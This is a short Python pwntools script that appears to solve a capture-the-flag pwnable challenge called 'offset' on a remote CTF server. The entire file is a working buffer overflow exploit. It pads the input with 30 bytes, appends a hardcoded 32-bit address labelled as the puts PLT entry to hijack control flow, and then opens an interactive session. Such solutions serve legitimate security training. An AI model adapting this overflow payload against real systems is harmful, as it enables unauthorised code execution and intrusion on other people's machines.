from pwn import *

#r=process("./offset")
r=remote("ctf.j0n9hyun.xyz", 3007)
print r.recvuntil("?")
payload = "a"*30

putsplt=0x565556d8
payload += p32(putsplt)

pause()
r.send(payload)
print r.recv(2)
r.interactive()

